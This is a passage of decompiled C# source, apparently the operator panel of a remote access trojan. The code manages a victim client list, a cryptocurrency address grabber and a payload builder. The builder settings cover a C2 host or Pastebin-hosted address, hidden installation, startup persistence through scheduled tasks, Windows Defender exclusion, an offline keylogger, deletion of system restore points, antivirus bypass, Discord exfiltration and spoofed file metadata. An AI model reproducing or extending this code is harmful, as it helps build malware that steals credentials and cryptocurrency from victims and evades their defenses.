                    ProfileDate.ForeColor = Color.Green;
                }
                else
                {
                    ProfileDate.Text = Logger.auth_sample.user_data.expires.ToString();
                    ProfileDate.ForeColor = Color.Black;
                }
                bunifuLabel_2.Text = "ID - " + Logger.auth_sample.user_data.id + "@Silver";
            }
            catch
            {
                Close();
            }
            ImageProfileMune.Image = GetLogo(ProfileUsername.Text);
            if ((int)performanceCounter1.NextValue() > 60)
            {
                ImageMuneGood.Visible = false;
                ImageMuneError.Visible = true;
            }
            else
            {
                ImageMuneError.Visible = false;
                ImageMuneGood.Visible = true;
            }
        }
        TransitionShowng.ShowSync(MunePanelProfile);
    }

    private void BrowserLogo_Click(object sender, EventArgs e)
    {
        try
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "jpg |*.jpg"
            };
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            try
            {
                if (!Directory.Exists(Settings.PathLogo))
                {
                    Directory.CreateDirectory(Settings.PathLogo);
                }
                if (File.Exists(openFileDialog.FileName))
                {
                    Bitmap bitmap = new Bitmap(Image.FromFile(openFileDialog.FileName));
                    Image image = ClipToCircle(bitmap, new PointF(bitmap.Width / 2, bitmap.Height / 2), bitmap.Width / 2, Color.Transparent);
                    ImageProfileMune.Image = image;
                    ImageProfileMune.Image.Save(Settings.PathLogo + "\\" + ProfileUsername?.ToString() + ".photo");
                    Notifiecation.Show("Change Logo!", "Logo has been change successfully", Resources.SuccessNotif, Color.FromArgb(103, 185, 108));
                }
            }
            catch (Exception ex)
            {
                Notifiecation.Show("Change Logo!", ex.Message, Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
                Program.Silver.TransitionHiddeng.HideSync(panelForm);
                Close();
            }
        }
        catch (Exception ex2)
        {
            Notifiecation.Show("Change Logo!", ex2.Message, Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
    }

    public Image ClipToCircle(Image srcImage, PointF center, float radius, Color backGround)
    {
        Image image = new Bitmap(srcImage.Width, srcImage.Height, srcImage.PixelFormat);
        using Graphics graphics = Graphics.FromImage(image);
        RectangleF rect = new RectangleF(center.X - radius, center.Y - radius, radius * 2f, radius * 2f);
        graphics.SmoothingMode = SmoothingMode.AntiAlias;
        using (Brush brush = new SolidBrush(backGround))
        {
            graphics.FillRectangle(brush, 0, 0, image.Width, image.Height);
        }
        GraphicsPath graphicsPath = new GraphicsPath();
        graphicsPath.AddEllipse(rect);
        graphics.SetClip(graphicsPath);
        graphics.DrawImage(srcImage, 0, 0);
        return image;
    }

    public Bitmap GetLogo(string Filename)
    {
        try
        {
            if (File.Exists(Settings.PathLogo + "\\" + ProfileUsername?.ToString() + ".photo"))
            {
                return new Bitmap(Image.FromFile(Settings.PathLogo + "\\" + ProfileUsername?.ToString() + ".photo"));
            }
            if (Filename.Length > 0)
            {
                Assembly executingAssembly = Assembly.GetExecutingAssembly();
                string baseName = executingAssembly.GetName().Name + ".Properties.Resources";
                ResourceManager resourceManager = new ResourceManager(baseName, executingAssembly);
                return (Bitmap)resourceManager.GetObject(Filename[0].ToString().ToUpper());
            }
        }
        catch
        {
            return Resources.Empty;
        }
        return Resources.Empty;
    }

    private void TlogCurrencyGrabber_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (TlogCurrencyGrabber.Checked)
        {
            PanelMonitorGrabber.Enabled = true;
        }
        else
        {
            PanelMonitorGrabber.Enabled = false;
        }
    }

    private void ScanActiveAddresses_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (ScanActiveAddresses.Checked)
        {
            PanelListScan.Enabled = true;
        }
        else
        {
            PanelListScan.Enabled = false;
        }
    }

    private void BuilderAssemblyinformation_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (BuilderAssemblyinformation.Checked)
        {
            PanelAssemplyInfo.Enabled = false;
        }
        else
        {
            PanelAssemplyInfo.Enabled = true;
        }
    }

    private void BuilderDatemodified_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (BuilderDatemodified.Checked)
        {
            bunifuDatePicker1.Enabled = true;
        }
        else
        {
            bunifuDatePicker1.Enabled = false;
        }
    }

    private void BuilderChackIcon_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (BuilderChackIcon.Checked)
        {
            PanelBrowserIcon.Enabled = true;
            return;
        }
        PanelBrowserIcon.Enabled = false;
        BuilderIconPath = "";
        NameIcon.Text = "...";
    }

    private void BrowserIcon_Click(object sender, EventArgs e)
    {
        try
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Icon |*.ico"
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                BuilderIconPath = openFileDialog.FileName;
                NameIcon.Text = Path.GetFileName(openFileDialog.FileName);
                ImageIcon.Image = Image.FromFile(openFileDialog.FileName);
                Notifiecation.Show("Builder!", "Icon has been removed successfully", Resources.SuccessNotif, Color.FromArgb(103, 185, 108));
            }
            else
            {
                ImageIcon.Image = Resources.BuilderNothingIcon;
                BuilderIconPath = "";
                NameIcon.Text = "...";
                Notifiecation.Show("Builder!", "Icon has been removed successfully", Resources.InfoNotif, Color.FromArgb(52, 152, 219));
            }
        }
        catch (Exception ex)
        {
            Notifiecation.Show("Builder!", ex.Message, Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
    }

    private void SaveProperties_Click(object sender, EventArgs e)
    {
        TransitionHiddeng.HideSync(MunePanelProfile);
    }

    private void Vr4_KeyPress(object sender, KeyPressEventArgs e)
    {
        if (!char.IsNumber(e.KeyChar) & !char.IsControl(e.KeyChar))
        {
            e.Handled = true;
        }
    }

    private void Vr4_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Back)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void SaveMonitorData_Click(object sender, EventArgs e)
    {
        SaveProfilMonitor();
        TransitionHiddeng.HideSync(MunePanelProfile);
    }

    private void TimerDashboard_Tick(object sender, EventArgs e)
    {
        TimeME.Text = DateTime.Now.ToLongTimeString();
        lock (Settings.LockListviewClients)
        {
            if (PageForm.SelectedIndex == 0)
            {
                CountClients.Text = ClientsList.RowCount.ToString();
                CountSentData.Text = Methods.BytesToString(Settings.SentValue);
                CountReceivedData.Text = Methods.BytesToString(Settings.ReceivedValue);
                ProgressBarReceivedData.Value = Convert.ToInt32(Settings.ReceivedValue);
                ProgressBarDataSent.Value = Convert.ToInt32(Settings.SentValue);
                CountDesconnect.Text = Settings.DashboardDisconnect.ToString();
                CountGrabber.Text = Settings.CountGrabber.ToString();
                CountSessionMonitor.Text = Settings.CountMonitor.ToString();
                UsageCPU.Text = (int)performanceCounter1.NextValue() + "%";
            }
            else
            {
                if (PageForm.SelectedIndex == 1)
                {
                    InfoMonitorCounts.Text = Settings.CountGrabber + " Cryptocurrency grabber | " + Settings.CountMonitor + " Session monitor";
                    return;
                }
                if (PageForm.SelectedIndex == 2)
                {
                    InfoListClients.Text = ClientsList.SelectedRows.Count + " Selected | " + CountNewClient.Text + " New Client | " + ClientsList.RowCount + " Client";
                    return;
                }
            }
            if (TabMune.SelectedIndex == 2 && MunePanelProfile.Visible)
            {
                ValueMunePerformince.Text = (int)performanceCounter2.NextValue() + "%";
            }
        }
        Methods.MinimizeFootprint();
    }

    private void CleanInfoDahboard(int Value)
    {
        if (Value == 1 || Value == 0)
        {
            ProgressBarWinXP.Value = 0;
            CountWinXP.Text = "0%";
        }
        if (Value == 7 || Value == 0)
        {
            ProgressBarWin7.Value = 0;
            CountWin7.Text = "0%";
        }
        if (Value == 10 || Value == 0)
        {
            bunifuLabel_1.Text = "0%";
        }
        if (Value == 11 || Value == 0)
        {
            ProgressBarWin11.Value = 0;
            bunifuLabel_0.Text = "0%";
        }
        if ((Value == 12 || Value == 0) && int.Parse(CountNewClient.Text) > 0)
        {
            CountNewClient.Text = "0";
        }
    }

    private void CountClients_TextChanged(object sender, EventArgs e)
    {
        string text = "";
        int rowCount = ClientsList.RowCount;
        int num = 0;
        int num2 = 0;
        int num3 = 0;
        int num4 = 0;
        int num5 = 0;
        if (ClientsList.RowCount == 0)
        {
            CleanInfoDahboard(0);
            return;
        }
        try
        {
            foreach (DataGridViewRow item in (IEnumerable)ClientsList.Rows)
            {
                Color backColor = item.Cells[2].Style.BackColor;
                if (backColor == Color.Orange)
                {
                    num5++;
                }
                try
                {
                    if (!text.Contains(item.Cells[9].Value.ToString()))
                    {
                        text = item.Cells[9].Value.ToString();
                    }
                }
                catch
                {
                }
                if (text.Contains("windows xp") || text.Contains("xp") || (text.Contains("Windows vista") | text.Contains("7")))
                {
                    num++;
                }
                if (text.Contains("windows 8") | text.Contains("win 8"))
                {
                    num2++;
                }
                if (text.Contains("windows 10") | text.Contains("10"))
                {
                    num3++;
                }
                if (text.Contains("windows 11") | text.Contains("11"))
                {
                    num4++;
                }
            }
            if (num5 > 0)
            {
                CountNewClient.Text = num5.ToString();
            }
            if (num > 0)
            {
                ProgressBarWinXP.Value = num * 100 / rowCount;
                CountWinXP.Text = ProgressBarWinXP.Value + "%";
            }
            else
            {
                CleanInfoDahboard(1);
            }
            if (num2 > 0)
            {
                ProgressBarWin7.Value = num2 * 100 / rowCount;
                CountWin7.Text = ProgressBarWin7.Value + "%";
            }
            else
            {
                CleanInfoDahboard(7);
            }
            if (num3 > 0)
            {
                ProgressBarWin10.Value = num3 * 100 / rowCount;
                bunifuLabel_1.Text = ProgressBarWin10.Value + "%";
            }
            else
            {
                CleanInfoDahboard(10);
            }
            if (num4 > 0)
            {
                ProgressBarWin11.Value = num4 * 100 / rowCount;
                bunifuLabel_0.Text = ProgressBarWin11.Value + "%";
            }
            else
            {
                CleanInfoDahboard(11);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.ToString());
        }
    }

    private void TransitionLogin_SelectedIndexChanged(object sender, EventArgs e)
    {
        if (TransitionLogin.SelectedIndex == 0)
        {
            TransitionShowng.AnimationType = AnimationType.Custom;
        }
        if (TransitionLogin.SelectedIndex == 1)
        {
            TransitionShowng.AnimationType = AnimationType.Rotate;
        }
        if (TransitionLogin.SelectedIndex == 2)
        {
            TransitionShowng.AnimationType = AnimationType.HorizSlide;
        }
        if (TransitionLogin.SelectedIndex == 3)
        {
            TransitionShowng.AnimationType = AnimationType.VertSlide;
        }
        if (TransitionLogin.SelectedIndex == 4)
        {
            TransitionShowng.AnimationType = AnimationType.Scale;
        }
        if (TransitionLogin.SelectedIndex == 5)
        {
            TransitionShowng.AnimationType = AnimationType.ScaleAndRotate;
        }
        if (TransitionLogin.SelectedIndex == 6)
        {
            TransitionShowng.AnimationType = AnimationType.HorizSlideAndRotate;
        }
        if (TransitionLogin.SelectedIndex == 7)
        {
            TransitionShowng.AnimationType = AnimationType.ScaleAndHorizSlide;
        }
        if (TransitionLogin.SelectedIndex == 8)
        {
            TransitionShowng.AnimationType = AnimationType.Transparent;
        }
        if (TransitionLogin.SelectedIndex == 9)
        {
            TransitionShowng.AnimationType = AnimationType.Leaf;
        }
        if (TransitionLogin.SelectedIndex == 10)
        {
            TransitionShowng.AnimationType = AnimationType.Mosaic;
        }
        if (TransitionLogin.SelectedIndex == 11)
        {
            TransitionShowng.AnimationType = AnimationType.Particles;
        }
        if (TransitionLogin.SelectedIndex == 12)
        {
            TransitionShowng.AnimationType = AnimationType.VertBlind;
        }
    }

    private void TransitionOut_SelectedIndexChanged(object sender, EventArgs e)
    {
        if (TransitionOut.SelectedIndex == 0)
        {
            TransitionHiddeng.AnimationType = AnimationType.Custom;
        }
        if (TransitionOut.SelectedIndex == 1)
        {
            TransitionHiddeng.AnimationType = AnimationType.Rotate;
        }
        if (TransitionOut.SelectedIndex == 2)
        {
            TransitionHiddeng.AnimationType = AnimationType.HorizSlide;
        }
        if (TransitionOut.SelectedIndex == 3)
        {
            TransitionHiddeng.AnimationType = AnimationType.VertSlide;
        }
        if (TransitionOut.SelectedIndex == 4)
        {
            TransitionHiddeng.AnimationType = AnimationType.Scale;
        }
        if (TransitionOut.SelectedIndex == 5)
        {
            TransitionHiddeng.AnimationType = AnimationType.ScaleAndRotate;
        }
        if (TransitionOut.SelectedIndex == 6)
        {
            TransitionHiddeng.AnimationType = AnimationType.HorizSlideAndRotate;
        }
        if (TransitionOut.SelectedIndex == 7)
        {
            TransitionHiddeng.AnimationType = AnimationType.ScaleAndHorizSlide;
        }
        if (TransitionOut.SelectedIndex == 8)
        {
            TransitionHiddeng.AnimationType = AnimationType.Transparent;
        }
        if (TransitionOut.SelectedIndex == 9)
        {
            TransitionHiddeng.AnimationType = AnimationType.Leaf;
        }
        if (TransitionOut.SelectedIndex == 10)
        {
            TransitionHiddeng.AnimationType = AnimationType.Mosaic;
        }
        if (TransitionOut.SelectedIndex == 11)
        {
            TransitionHiddeng.AnimationType = AnimationType.Particles;
        }
        if (TransitionOut.SelectedIndex == 12)
        {
            TransitionHiddeng.AnimationType = AnimationType.VertBlind;
        }
    }

    private void TransitionSpeed_SelectedIndexChanged(object sender, EventArgs e)
    {
        if (TransitionSpeed.Text == "1")
        {
            TransitionShowng.TimeStep = 0.01f;
            TransitionHiddeng.TimeStep = 0.01f;
        }
        else if (TransitionSpeed.Text == "2")
        {
            TransitionShowng.TimeStep = 0.02f;
            TransitionHiddeng.TimeStep = 0.02f;
        }
        else if (TransitionSpeed.Text == "3")
        {
            TransitionShowng.TimeStep = 0.03f;
            TransitionHiddeng.TimeStep = 0.03f;
        }
        else if (TransitionSpeed.Text == "4")
        {
            TransitionShowng.TimeStep = 0.04f;
            TransitionHiddeng.TimeStep = 0.04f;
        }
        else if (TransitionSpeed.Text == "5")
        {
            TransitionShowng.TimeStep = 0.05f;
            TransitionHiddeng.TimeStep = 0.05f;
        }
        else if (TransitionSpeed.Text == "6")
        {
            TransitionShowng.TimeStep = 0.06f;
            TransitionHiddeng.TimeStep = 0.06f;
        }
    }

    private void EdgecurvatureForm_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EdgecurvatureForm.Checked)
        {
            PanelTOP.Visible = true;
            PanelLeft.Visible = true;
            PanelRight.Visible = true;
            PanelBottom.Visible = true;
            CurvatureProperties.Visible = true;
            Settings.EnableEdgecurvatureForm = true;
        }
        else
        {
            PanelTOP.Visible = false;
            PanelLeft.Visible = false;
            PanelRight.Visible = false;
            PanelBottom.Visible = false;
            CurvatureProperties.Visible = false;
            Settings.EnableEdgecurvatureForm = false;
        }
    }

    private void TestNotif_Click(object sender, EventArgs e)
    {
        if (TextDelayNotif.Text == "0" || TextDelayNotif.Text == "")
        {
            Notifiecation.Show("Alert!", "Please enter a numeric value greater than Zero in delay textBox", Resources.Alert, Color.FromArgb(248, 189, 9));
            return;
        }
        if (SpeedNotif.Text == "0" || SpeedNotif.Text == "")
        {
            Notifiecation.Show("Alert!", "Please enter a numeric value greater than Zero in speed textBox", Resources.Alert, Color.FromArgb(248, 189, 9));
            return;
        }
        if (EffectNotif.Checked)
        {
            PopupNotifiection = new PopupNotifier();
        }
        PopupNotifiection.TitleText = TextTitleNotif.Text;
        PopupNotifiection.ContentText = TextMessageNotif.Text;
        PopupNotifiection.Delay = int.Parse(TextDelayNotif.Text);
        PopupNotifiection.AnimationDuration = int.Parse(SpeedNotif.Text);
        if (ShowIconNotif.Checked)
        {
            PopupNotifiection.Image = Resources.Bitmap_1;
        }
        else
        {
            PopupNotifiection.Image = null;
        }
        PopupNotifiection.ShowCloseButton = ShowCloseButtNotif.Checked;
        PopupNotifiection.Scroll = ScrollToOutNotif.Checked;
        PopupNotifiection.GetFormTopColor = Color.Orange;
        PopupNotifiection.GetFormBotomColor = Color.FromArgb(229, 229, 234);
        PopupNotifiection.TitlePadding = new Padding(2);
        PopupNotifiection.ContentPadding = new Padding(2);
        PopupNotifiection.ImagePadding = new Padding(5);
        PopupNotifiection.Popup();
    }

    private void SpeedNotif_KeyPress(object sender, KeyPressEventArgs e)
    {
        if (!char.IsNumber(e.KeyChar) & !char.IsControl(e.KeyChar))
        {
            e.Handled = true;
        }
    }

    private void SaveSetting_Click(object sender, EventArgs e)
    {
        try
        {
            if (TextDelayNotif.Text == "0" || TextDelayNotif.Text == "")
            {
                Notifiecation.Show("Alert!", "Please enter a numeric value greater than Zero in delay textBox", Resources.Alert, Color.FromArgb(248, 189, 9));
                return;
            }
            if (SpeedNotif.Text == "0" || SpeedNotif.Text == "")
            {
                Notifiecation.Show("Alert!", "Please enter a numeric value greater than Zero in speed textBox", Resources.Alert, Color.FromArgb(248, 189, 9));
                return;
            }
            SaveNotifSetting();
            SaveSettingData();
            Notifiecation.Show("Settings", "Settings saved successfully", Resources.SuccessNotif, Color.FromArgb(103, 185, 108));
        }
        catch
        {
            Notifiecation.Show("Settings!", "Settings saved successfully", Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
    }

    private void CurvatureFormTrackBar_Scroll(object sender, ScrollEventArgs e)
    {
        PanelFormElipse.ElipseRadius = CurvatureFormTrackBar.Value;
        Settings.CurvatureForm = CurvatureFormTrackBar.Value;
        CountScroolForm.Text = "Curvature(max) " + Settings.CurvatureForm * 100 / 60;
    }

    private void CurvatureFormTrackBar_ValueChanged(object sender, EventArgs e)
    {
        PanelFormElipse.ElipseRadius = CurvatureFormTrackBar.Value;
        Settings.CurvatureForm = CurvatureFormTrackBar.Value;
    }

    private void CurvatureProperties_SelectedIndexChanged(object sender, EventArgs e)
    {
        Color color = ((CurvatureProperties.SelectedIndex != 0) ? Color.FromName(CurvatureProperties.Text) : Color.Gainsboro);
        PanelLeft.BackgroundColor = color;
        Settings.ColorCurvatureForm = color;
        PanelTOP.BackgroundColor = color;
        PanelBottom.BackgroundColor = color;
        PanelRight.BackgroundColor = color;
    }

    private void ReadSettingData()
    {
        try
        {
            Profile profile = new Profile("Settings");
            EnableLogo.Checked = profile.EnableLogo;
            EnableID.Checked = profile.EnableID;
            EnableIP.Checked = profile.EnableIP;
            EnableFlag.Checked = profile.EnableFlag;
            EnableCountry.Checked = profile.EnableCountry;
            EnableWindowsActive.Checked = profile.EnableUsername;
            EnablePings.Checked = profile.EnableVersion;
            EnableMonitors.Checked = profile.EnableMonitor;
            TransitionLogin.SelectedIndex = Convert.ToInt32(profile.PageL);
            TransitionOut.SelectedIndex = Convert.ToInt32(profile.PageO);
            TransitionSpeed.SelectedIndex = Convert.ToInt32(profile.PageSpeed);
            EdgecurvatureForm.Checked = profile.EnableEdgecurvature;
            CurvatureProperties.SelectedIndex = profile.DownColorForm;
            CurvatureFormTrackBar.Value = profile.CurvatureForm;
        }
        catch
        {
            Notifiecation.Show("Error!", "An error occurred reading data from file 'Settings.XML'!!", Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
    }

    private void SaveSettingData()
    {
        try
        {
            new Profile("Settings")
            {
                EnableLogo = EnableLogo.Checked,
                EnableID = EnableID.Checked,
                EnableIP = EnableIP.Checked,
                EnableFlag = EnableFlag.Checked,
                EnableCountry = EnableCountry.Checked,
                EnableUsername = EnableWindowsActive.Checked,
                EnableVersion = EnablePings.Checked,
                EnableMonitor = EnableMonitors.Checked,
                PageL = TransitionLogin.SelectedIndex.ToString(),
                PageO = TransitionOut.SelectedIndex.ToString(),
                PageSpeed = TransitionSpeed.SelectedIndex.ToString(),
                EnableEdgecurvature = EdgecurvatureForm.Checked,
                DownColorForm = CurvatureProperties.SelectedIndex,
                CurvatureForm = CurvatureFormTrackBar.Value
            };
        }
        catch
        {
            Notifiecation.Show("Error!", "An error occurred saveing data from file 'Settings.XML'!!", Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
    }

    private void ReadProfilMonitor()
    {
        try
        {
            Profile profile = new Profile("Monitor");
            TlogCurrencyGrabber.Checked = profile.Grabber;
            TextBTC.Text = profile.BTC;
            TextETH.Text = profile.ETH;
            TextLTC.Text = profile.XMR;
            ScanActiveAddresses.Checked = profile.ScanWindowsActive;
            string[] array = profile.ListWindowsActive.Split(',');
            string[] array2 = array;
            foreach (string text in array2)
            {
                if (text.ToString().Length > 0)
                {
                    ListScanActiveAddresses.Rows.Add(text.ToString());
                }
            }
        }
        catch
        {
            Notifiecation.Show("Error!", "An error occurred reading data from file 'Monitor.XML'!!", Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
    }

    private void SaveProfilMonitor()
    {
        try
        {
            new Profile("Monitor")
            {
                Grabber = TlogCurrencyGrabber.Checked,
                BTC = TextBTC.Text,
                ETH = TextETH.Text,
                XMR = TextLTC.Text,
                ScanWindowsActive = ScanActiveAddresses.Checked,
                ListWindowsActive = GetListWinActive()
            };
        }
        catch
        {
            Notifiecation.Show("Error!", "An error occurred saveing data from file 'Monitor.XML'!!", Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
    }

    private string GetListWinActive()
    {
        string text = string.Empty;
        foreach (DataGridViewRow item in (IEnumerable)ListScanActiveAddresses.Rows)
        {
            if (!item.IsNewRow)
            {
                text = text + item.Cells[0].Value.ToString() + ",";
            }
        }
        return text;
    }

    private void ReadNotifSetting()
    {
        try
        {
            Profile profile = new Profile("Notifcation");
            TextTitleNotif.Text = profile.TextTitleNotif;
            TextMessageNotif.Text = profile.TextMessageNotif;
            TextDelayNotif.Text = ((int.Parse(profile.TextDelayNotif) > 0) ? profile.TextDelayNotif : "2000");
            ShowIconNotif.Checked = profile.ShowIconNotif;
            ShowCloseButtNotif.Checked = profile.ShowCloseButtNotif;
            ScrollToOutNotif.Checked = profile.ScrollToOutNotif;
            EffectNotif.Checked = profile.EffectNotif;
            SpeedNotif.Text = ((int.Parse(profile.SpeedNotif) > 0) ? profile.SpeedNotif : "500");
            Settings.DelayNotif = profile.TextDelayNotif;
            Settings.ShowIconNotif = profile.ShowIconNotif;
            Settings.CloseButtonNotif = profile.ShowCloseButtNotif;
            Settings.ScrollToOutNotif = profile.ScrollToOutNotif;
            Settings.EffectNotif = profile.EffectNotif;
            Settings.SpeedNotif = profile.SpeedNotif;
        }
        catch
        {
            Notifiecation.Show("Error!", "An error occurred reading data from file 'Notifcation.XML'!!", Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
    }

    public void SaveNotifSetting()
    {
        try
        {
            new Profile("Notifcation")
            {
                TextTitleNotif = TextTitleNotif.Text,
                TextMessageNotif = TextMessageNotif.Text,
                TextDelayNotif = TextDelayNotif.Text,
                ShowIconNotif = ShowIconNotif.Checked,
                ShowCloseButtNotif = ShowCloseButtNotif.Checked,
                ScrollToOutNotif = ScrollToOutNotif.Checked,
                EffectNotif = EffectNotif.Checked,
                SpeedNotif = SpeedNotif.Text
            };
            Settings.DelayNotif = TextDelayNotif.Text;
            Settings.SpeedNotif = SpeedNotif.Text;
            Settings.ShowIconNotif = ShowIconNotif.Checked;
            Settings.CloseButtonNotif = ShowCloseButtNotif.Checked;
            Settings.ScrollToOutNotif = ScrollToOutNotif.Checked;
            Settings.EffectNotif = EffectNotif.Checked;
        }
        catch
        {
            Notifiecation.Show("Error!", "An error occurred saveing data from file 'Notifcation.XML'!!", Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
    }

    private void ReadProfilBuilder()
    {
        try
        {
            Profile profile = new Profile("Builder");
            BuilderGroup.Text = profile.Group;
            BuilderKey.Text = profile.DataEncryptionKey;
            HostDefault.Checked = profile.Boolean_0;
            HostHtml.Checked = profile.Pastebin;
            BuilderHost.Text = profile.Host;
            BuilderPort.Text = profile.Port;
            BuilderProcessMutex.Text = profile.ProcessMetux;
            BuilderInstallation.Checked = profile.Installation;
            AutoStartup.Checked = profile.AutoStartup;
            Foldername.Text = profile.Foldername;
            BuilderUserProfile.Checked = profile.ProgramData;
            BuilderApplicationData.Checked = profile.ProgramFiles;
            BuilderTemplates.Checked = profile.AppData;
            BuilderProcessName.Text = profile.Processname;
            BuilderHiddenInstall.Checked = profile.HiddenInstall;
            BuilderBloackAccessPath.Checked = profile.BlockAccessPath;
            DeleteSystemRestore.Checked = profile.DeleteSystemRestorePoints;
            bunifuCheckBox_0.Checked = profile.Boolean_1;
            keyloggerOfflien.Checked = profile.KeyloaggarOfflien;
            BuilderDefender.Checked = profile.DefeindrExclustion;
            HiddenProcess.Checked = profile.HiddenProcess;
            BuilderCreateTask.Checked = profile.BuilderCreateTask;
            ComDownTasks.SelectedIndex = profile.BuilderRunTask;
            BuilderDelay.Checked = profile.Delay;
            BuilderExcutionDelay.Text = profile.NumDelay;
            BuilderDelayConnect.Checked = profile.ReconnectionDelay;
            BuilderReconnectDelay.Text = profile.String_1;
            SaveSettings.Checked = profile.SaveSettings;
            BaypassAV.Checked = profile.BypassAV;
            EnabledDiscord.Checked = profile.EnableDiscord;
            bunifuTextBox_0.Text = profile.String_0;
            Payloadname.Text = profile.PayloadName;
            EXE.Checked = profile.Exe;
            COM.Checked = profile.Com;
            CMD.Checked = profile.Cmd;
            PIF.Checked = profile.pif;
            SCR.Checked = profile.Scr;
            BuilderAssemblyinformation.Checked = profile.AssemblyInformation;
            BuilderTitleAssembly.Text = profile.Title;
            BuilderDescriptionsAssembly.Text = profile.Description;
            BuilderCopyrightAssembly.Text = profile.Copyright;
            BuilderCompanyAssembly.Text = profile.Company;
            BuilderTrademarksAssembly.Text = profile.Trademarks;
            BuilderDatemodified.Checked = profile.Datemodified;
            bunifuDatePicker1.Value = profile.DatemodifiedValue;
            BuilderChackIcon.Checked = profile.Icon;
            BuilderIconPath = profile.IconPath;
            Vr1.Text = profile.VR1;
            Vr2.Text = profile.VR2;
            Vr3.Text = profile.VR3;
            Vr4.Text = profile.VR4;
            if (File.Exists(BuilderIconPath))
            {
                NameIcon.Text = Path.GetFileName(profile.IconPath);
                ImageIcon.Image = Image.FromFile(profile.IconPath);
            }
            else
            {
                BuilderChackIcon.Checked = false;
                ImageIcon.Image = Resources.BuilderNothingIcon;
            }
        }
        catch
        {
            Notifiecation.Show("Error!", "An error occurred reading data from file 'Builder.XML'!!", Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
    }

    private void SaveProfilBuilder()
    {
        try
        {
            new Profile("Builder")
            {
                Group = BuilderGroup.Text,
                DataEncryptionKey = BuilderKey.Text,
                Boolean_0 = HostDefault.Checked,
                Pastebin = HostHtml.Checked,
                Host = BuilderHost.Text,
                Port = BuilderPort.Text,
                ProcessMetux = BuilderProcessMutex.Text,
                Installation = BuilderInstallation.Checked,
                AutoStartup = AutoStartup.Checked,
                Foldername = Foldername.Text,
                ProgramData = BuilderUserProfile.Checked,
                ProgramFiles = BuilderApplicationData.Checked,
                AppData = BuilderTemplates.Checked,
                Processname = BuilderProcessName.Text,
                HiddenInstall = BuilderHiddenInstall.Checked,
                BlockAccessPath = BuilderBloackAccessPath.Checked,
                DeleteSystemRestorePoints = DeleteSystemRestore.Checked,
                Boolean_1 = bunifuCheckBox_0.Checked,
                KeyloaggarOfflien = keyloggerOfflien.Checked,
                DefeindrExclustion = BuilderDefender.Checked,
                HiddenProcess = HiddenProcess.Checked,
                BuilderCreateTask = BuilderCreateTask.Checked,
                BuilderRunTask = ComDownTasks.SelectedIndex,
                Delay = BuilderDelay.Checked,
                NumDelay = BuilderExcutionDelay.Text,
                ReconnectionDelay = BuilderDelayConnect.Checked,
                String_1 = BuilderReconnectDelay.Text,
                SaveSettings = SaveSettings.Checked,
                BypassAV = BaypassAV.Checked,
                PayloadName = Payloadname.Text,
                EnableDiscord = EnabledDiscord.Checked,
                String_0 = bunifuTextBox_0.Text,
                Exe = EXE.Checked,
                Com = COM.Checked,
                Cmd = CMD.Checked,
                pif = PIF.Checked,
                Scr = SCR.Checked,
                AssemblyInformation = BuilderAssemblyinformation.Checked,
                Title = BuilderTitleAssembly.Text,
                Description = BuilderDescriptionsAssembly.Text,
                Copyright = BuilderCopyrightAssembly.Text,
                Company = BuilderCompanyAssembly.Text,
                Trademarks = BuilderTrademarksAssembly.Text,
                Datemodified = BuilderDatemodified.Checked,
                DatemodifiedValue = bunifuDatePicker1.Value,
                VR1 = Vr1.Text,
                VR2 = Vr2.Text,
                VR3 = Vr3.Text,
                VR4 = Vr4.Text,
                Icon = BuilderChackIcon.Checked,
                IconPath = BuilderIconPath
            };
        }
        catch
        {
            Notifiecation.Show("Error!", "An error occurred saveing data from file 'Builder.XML'!!", Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
        }
    }

    private void EnabledDiscord_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnabledDiscord.Checked)
        {
            EnabledRecoveryData.Enabled = true;
            bunifuTextBox_0.Enabled = true;
        }
        else
        {
            EnabledRecoveryData.Enabled = false;
            bunifuTextBox_0.Enabled = false;
        }
    }

    private void HostHtml_CheckedChanged2(object sender, BunifuRadioButton.CheckedChangedEventArgs e)
    {
        if (HostHtml.Checked)
        {
            BuilderPort.Enabled = false;
            BuilderHost.PlaceholderText = "Wwww.pastebin.com/Host:Port";
        }
    }

    private void HostDefault_CheckedChanged2(object sender, BunifuRadioButton.CheckedChangedEventArgs e)
    {
        if (HostDefault.Checked)
        {
            BuilderPort.Enabled = true;
            BuilderHost.PlaceholderText = "Host OR IP";
        }
    }

    private void BuilderInstallation_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (BuilderInstallation.Checked)
        {
            InsPanel.Enabled = true;
        }
        else
        {
            InsPanel.Enabled = false;
        }
    }

    private string GetDownDropTask()
    {
        string result = " /create /sc hourly /mo 1 /tn \"\"%Mytask%-HOURLY-01\"\" /tr \"\"%MyFile%\"\" /st 00:00";
        string result2 = " /create /sc daily /tn \"\"%Mytask%-DAILY-21PM\"\" /TR \"\"%MyFile%\"\" /ST 21:00";
